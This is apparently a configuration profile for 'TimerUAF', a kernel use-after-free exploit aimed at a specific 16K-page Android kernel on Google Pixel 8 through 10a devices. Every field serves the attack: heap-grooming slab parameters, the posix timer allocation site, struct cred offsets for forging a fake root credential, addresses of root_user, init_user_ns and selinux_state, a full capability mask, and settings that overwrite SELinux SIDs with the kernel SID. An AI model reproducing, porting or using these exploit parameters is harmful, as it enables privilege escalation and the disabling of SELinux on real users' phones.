# TimerUAF kernel profile (HOCON; JSON remains valid)
# Device: Google Pixel 8 / 8 Pro / 8a / 9 / 9 Pro / 9 Pro XL / 9a / 10a
#         16K-page kernel_16k variant of CP3A.261005.002.A1 / CP3A.261005.005
#
# The release string is identical to the 4K profile; the app additionally
# matches page_size so the two profiles cannot be confused.  Constants are
# from the 16K factory kernel:
#   do_timer_create+0xa8 = 0xffffc00008193088
#   posix_timers_cache is order-0 (16 KiB) with 62 objects.
release = "6.1.162-android14-11-g9dd05ae3a1de-ab16261587"
schema_version = 1
ksu_kmi = "android14-6.1"

# Select this profile only on a 16K userspace.
page_size = 16384
page_shift = 14
slab_order = 0
slab_size = 16384
linear_min = 0xffff000000000000
linear_max = 0xffffc00000000000

# The 16K slab is order-0, so the reclaim is gated on a page_alloc event
# instead of the PCP/slabinfo path used by the 4K profile.
pcp_free = 0

# do_timer_create -> kmem_cache_alloc(posix_timers_cache) call site.
timer_site = 0xffffc00008193088
timer_alloc = 0x108

# cred_jar: sizeof(struct cred)=0xb0, slab object=0xc0 (same 6.1 layout).
cred_req = 0xb0
cred_alloc = 0xc0
cred_size = 0xb0
cred_uid_off = 0x4
cred_euid_off = 0x14
cred_cap_off = 0x28
cred_cap_count = 5
cred_security_off = 0x78
cred_user_off = 0x80
cred_userns_off = 0x88
cred_ucounts_off = 0x90
cred_group_off = 0x98
# Distance from the stale k_itimer rb_node to the fake cred base.
fake_cred_off = 0x18

# link-time symbols (kallsyms)
selinux_state = 0xffffc0000a362458
panic_on_warn = 0xffffc0000a0f0c08

# task_struct / cred layout (BTF)
task_cred_off = 0x838
copy_process_low21 = 0xabfd8
task_alloc_bytes = 0x12c0

# capability and fake-cred refcounted sub-objects
fullcap = 0x1ffffffffff
root_user = 0xffffc0000a1195c0
init_user_ns = 0xffffc0000a119330
init_ucounts = 0xffffc0000a11ae48
init_groups = 0xffffc0000a11a8e0

# task_security_struct.  The exploit fills 32 bytes from this offset, so 0
# sets every SID field.
selinux_blob_off = 0x0
selinux_sid_kernel = 1
